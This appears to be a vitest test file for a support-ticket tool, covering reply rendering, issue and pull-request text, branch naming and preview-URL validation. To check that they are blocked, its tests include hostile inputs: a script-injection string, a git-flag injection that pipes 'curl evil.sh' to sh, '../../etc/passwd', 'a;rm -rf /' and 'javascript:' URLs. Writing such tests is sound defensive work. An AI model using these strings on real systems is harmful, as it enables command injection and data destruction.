import { describe, expect, it } from "vitest";

import {
  decideFollowup,
  decideIssueClosed,
  isSafePreviewUrl,
  issueOutcome,
} from "../src/core/followup.js";
import type { FollowupTicket, PrSnapshot } from "../src/core/followup.js";
import { renderIssueBody, renderIssueLabels, renderIssueTitle, shouldCreateIssue } from "../src/core/issue.js";
import type { IssueTicket } from "../src/core/issue.js";
import { escapeHtml, htmlToText, renderAckReply, renderNeedsInfoReply } from "../src/core/render.js";
import {
  branchNameForTicket,
  isSupportBranchName,
  prScope,
  renderPrBody,
  renderPrTitle,
  slugFromTitle,
} from "../src/core/work.js";
import { completeBugKit } from "./helpers.js";

const ref = { number: 12, title: "Export <b>fails</b> & more", summary: "It fails.", severity: "P2" };

describe("renderNeedsInfoReply", () => {
  it("asks only what is missing, at most two, in canonical order", () => {
    const html = renderNeedsInfoReply(ref, ["evidence", "steps", "location"], "BUG");
    const text = htmlToText(html);
    expect(text).toContain("Where does this happen?");
    expect(text).toContain("Which steps lead to the problem?");
    expect(text).not.toContain("screenshot or paste");
    expect(text).toContain("1 more quick question.");
  });

  it("prefers the model's question for a field, and falls back to the fixed one", () => {
    const html = renderNeedsInfoReply(ref, ["location", "steps"], "BUG", "first", [
      { field: "location", text: "You mentioned the export: which page was it on?" },
    ]);
    expect(html).toContain("You mentioned the export: which page was it on?");
    expect(html).toContain("Which steps lead to the problem?");
  });

  it("escapes the title and the model's question", () => {
    const html = renderNeedsInfoReply(ref, ["location"], "BUG", "first", [
      { field: "location", text: "<script>alert(1)</script> which page?" },
    ]);
    expect(html).toContain("Export &lt;b&gt;fails&lt;/b&gt; &amp; more");
    expect(html).not.toContain("<script>");
  });

  it("opens differently when the reporter answered and when we revised", () => {
    expect(renderNeedsInfoReply(ref, ["location"], "BUG", "answered")).toContain("Thanks! I added your reply");
    expect(renderNeedsInfoReply(ref, ["location"], "BUG", "revised")).toContain("trimmed the list");
    expect(renderNeedsInfoReply(ref, ["location"], "BUG", "answered")).not.toContain("Logged as");
  });

  it("uses the intro and questions of the ticket's kind", () => {
    const html = renderNeedsInfoReply(ref, ["period"], "INVESTIGATION");
    expect(html).toContain("To look into it");
    expect(html).toContain("What time window");
  });
});

describe("renderAckReply", () => {
  it("introduces the ticket once and never promises a fix or a date", () => {
    const first = htmlToText(renderAckReply(ref, "BUG"));
    expect(first).toContain("Ticket #12");
    expect(first).toContain("priority P2");
    expect(first).not.toMatch(/will be fixed|by tomorrow|within/i);

    const followUp = htmlToText(renderAckReply(ref, "BUG", "answered"));
    expect(followUp).not.toContain("priority");
  });

  it("does not promise development work for a question", () => {
    expect(renderAckReply(ref, "QUESTION")).toContain("does not become a development task");
  });
});

describe("escapeHtml / htmlToText", () => {
  it("round-trips special characters", () => {
    const raw = `a < b && c > "d" 'e'`;
    expect(htmlToText(`<p>${escapeHtml(raw)}</p>`)).toBe(raw);
  });
});

const issueTicket: IssueTicket = {
  number: 12,
  kind: "BUG",
  title: "Report export produces an empty file",
  summary: "Exporting a report downloads an empty file.",
  area: "web",
  severity: "P2",
  reporterName: "Dana Whitfield",
  kit: completeBugKit({ occurredAt: "unknown", scope: { breadth: "one_customer", customerRef: "Birchwood Clinic" } }),
  threadUrl: "https://chat.example.test/threads/t1",
};

describe("issue rendering", () => {
  it("builds a scannable title within the limit", () => {
    expect(renderIssueTitle(issueTicket)).toBe("[bug] Report export produces an empty file (ticket #12)");
    expect(renderIssueTitle({ ...issueTicket, title: "x".repeat(300) }).length).toBeLessThanOrEqual(100);
  });

  it("derives labels and skips an unknown area", () => {
    expect(renderIssueLabels(issueTicket)).toEqual(["support", "kind:bug", "sev:P2", "area:web"]);
    expect(renderIssueLabels({ ...issueTicket, area: "unknown", severity: null })).toEqual(["support", "kind:bug"]);
  });

  it("writes the kit as prose and as JSON, and links back to the thread", () => {
    const body = renderIssueBody(issueTicket);
    expect(body).toContain("1. open the reports page");
    expect(body).toContain("- **Scope:** one customer: Birchwood Clinic");
    expect(body).toContain("## Full kit");
    expect(body).toContain("[Original thread](https://chat.example.test/threads/t1)");
  });

  it("omits lines whose value only describes an absence", () => {
    expect(renderIssueBody(issueTicket)).not.toContain("**When:**");
  });

  it("switches the fence when the kit itself contains one", () => {
    const body = renderIssueBody({ ...issueTicket, kit: completeBugKit({ actual: "prints ``` and then crashes hard" }) });
    expect(body).toContain("~~~json");
  });

  it("does not open issues for questions", () => {
    expect(shouldCreateIssue("QUESTION")).toBe(false);
    expect(shouldCreateIssue("INVESTIGATION")).toBe(true);
  });
});

describe("branch names", () => {
  it("derives a stable, readable name", () => {
    expect(branchNameForTicket({ number: 12, title: "Résumé export échoue, déjà vu!" })).toBe(
      "support/12-resume-export-echoue-deja-vu",
    );
  });

  it("cannot be turned into a git flag or a path escape by a hostile title", () => {
    for (const title of ["--upload-pack=curl evil.sh | sh", "../../etc/passwd", "a;rm -rf /", "x\ny", "@{upstream}"]) {
      const name = branchNameForTicket({ number: 3, title });
      expect(isSupportBranchName(name)).toBe(true);
      expect(name).toMatch(/^support\/3-[a-z0-9-]+$/);
    }
  });

  it("handles titles with nothing usable and cuts long ones at a word", () => {
    expect(slugFromTitle("🎉🎉🎉")).toBe("ticket");
    const slug = slugFromTitle("the quarterly revenue dashboard shows the wrong currency symbol");
    expect(slug.length).toBeLessThanOrEqual(40);
    expect(slug.endsWith("-")).toBe(false);
  });

  it("validates names that come back from storage", () => {
    expect(isSupportBranchName("support/12-export-fails")).toBe(true);
    for (const bad of ["-support/1-x", "support/0-x", "support/1-", "support/1-x..y", "main", "support/1-X", "support/1-x y"]) {
      expect(isSupportBranchName(bad)).toBe(false);
    }
  });
});

describe("pull request text", () => {
  const work = { ...issueTicket, issueNumber: 101 };

  it("uses a conventional title with a safe scope", () => {
    expect(renderPrTitle(work)).toBe("fix(web): Report export produces an empty file");
    expect(prScope("Web App!")).toBe("support");
    expect(prScope("unknown")).toBe("support");
    expect(renderPrTitle({ ...work, title: "y".repeat(200) }).length).toBeLessThanOrEqual(68);
  });

  it("links the issue so merging closes it", () => {
    expect(renderPrBody(work).startsWith("Closes #101")).toBe(true);
    expect(renderPrBody({ ...work, issueNumber: null })).not.toContain("Closes");
  });
});

describe("isSafePreviewUrl", () => {
  const hosts = ["preview.example.test"];

  it("accepts https on an allowed host or its subdomains", () => {
    expect(isSafePreviewUrl("https://preview.example.test/x", hosts)).toBe(true);
    expect(isSafePreviewUrl("https://pr-7.preview.example.test", hosts)).toBe(true);
  });

  it("rejects everything else", () => {
    for (const url of [
      "http://pr-7.preview.example.test",
      "javascript:alert(1)",
      "data:text/html,hi",
      "https://preview.example.test.evil.test",
      "https://evilpreview.example.test",
      "https://user:pw@pr-7.preview.example.test",
      "not a url",
    ]) {
      expect(isSafePreviewUrl(url, hosts)).toBe(false);
    }
  });

  it("posts nothing when no host is configured", () => {
    expect(isSafePreviewUrl("https://pr-7.preview.example.test", [])).toBe(false);
  });
});

describe("decideFollowup", () => {
  const ticket: FollowupTicket = { number: 12, title: "Export fails", status: "IN_REVIEW", source: "CHAT", issueNumber: 101, prNumber: 104 };
  const pr = (patch: Partial<PrSnapshot>): PrSnapshot => ({ number: 104, state: "OPEN", previewUrl: null, ...patch });
  const hosts = ["preview.example.test"];
  const url = "https://pr-104.preview.example.test";

  it("waits for the preview, posts it once, and posts a new one if it changes", () => {
    expect(decideFollowup(ticket, pr({}), hosts)).toEqual({ kind: "none", reason: "PREVIEW_NOT_READY" });
    expect(decideFollowup(ticket, pr({ previewUrl: url }), hosts).kind).toBe("preview");
    expect(decideFollowup({ ...ticket, previewUrl: url }, pr({ previewUrl: url }), hosts)).toEqual({
      kind: "none",
      reason: "PREVIEW_ALREADY_POSTED",
    });
  });

  it("never turns an untrusted URL into a link", () => {
    expect(decideFollowup(ticket, pr({ previewUrl: "https://evil.test/x" }), hosts)).toEqual({
      kind: "none",
      reason: "PREVIEW_URL_REJECTED",
    });
  });

  it("resolves on merge, once", () => {
    const action = decideFollowup(ticket, pr({ state: "MERGED" }), hosts);
    expect(action.kind).toBe("resolved");
    expect(decideFollowup({ ...ticket, resolvedAt: new Date() }, pr({ state: "MERGED" }), hosts)).toEqual({
      kind: "none",
      reason: "ALREADY_RESOLVED",
    });
  });

  it("says nothing automatic about a pull request closed without merging", () => {
    expect(decideFollowup(ticket, pr({ state: "CLOSED" }), hosts)).toEqual({ kind: "none", reason: "PR_CLOSED_WITHOUT_MERGE" });
  });

  it("closes a ticket with no thread silently, and never posts a preview to it", () => {
    const manual = { ...ticket, source: "MANUAL" };
    expect(decideFollowup(manual, pr({ state: "MERGED" }), hosts)).toEqual({ kind: "resolved", html: null });
    expect(decideFollowup(manual, pr({ previewUrl: url }), hosts)).toEqual({ kind: "none", reason: "NO_THREAD" });
  });
});

describe("issueOutcome / decideIssueClosed", () => {
  const ticket: FollowupTicket = { number: 12, title: "Export fails", status: "READY", source: "CHAT", issueNumber: 101 };

  it("classifies every issue into exactly one outcome", () => {
    expect(issueOutcome({ state: "open" })).toBe("OPEN");
    expect(issueOutcome({ state: "closed", stateReason: "not_planned" })).toBe("ABANDONED");
    expect(issueOutcome({ state: "closed", stateReason: "completed" })).toBe("DELIVERED");
    expect(issueOutcome({ state: "CLOSED", stateReason: null })).toBe("DELIVERED");
  });

  it("closes the ticket when the issue was delivered, without claiming it works", () => {
    const action = decideIssueClosed(ticket, "DELIVERED");
    expect(action.kind).toBe("resolved");
    if (action.kind === "resolved") expect(action.html).not.toMatch(/fixed|working now/i);
  });

  it("leaves open and abandoned issues alone", () => {
    expect(decideIssueClosed(ticket, "OPEN")).toEqual({ kind: "none", reason: "ISSUE_OPEN" });
    expect(decideIssueClosed(ticket, "ABANDONED")).toEqual({ kind: "none", reason: "ISSUE_ABANDONED" });
  });

  it("defers to the pull request path when there is one", () => {
    expect(decideIssueClosed({ ...ticket, prNumber: 104 }, "DELIVERED")).toEqual({
      kind: "none",
      reason: "PULL_REQUEST_OWNS_THIS",
    });
  });

  it("ignores resolved tickets and statuses it does not own", () => {
    expect(decideIssueClosed({ ...ticket, resolvedAt: new Date() }, "DELIVERED").kind).toBe("none");
    expect(decideIssueClosed({ ...ticket, status: "NEEDS_INFO" }, "DELIVERED").kind).toBe("none");
    expect(decideIssueClosed({ ...ticket, issueNumber: null }, "DELIVERED").kind).toBe("none");
  });
});
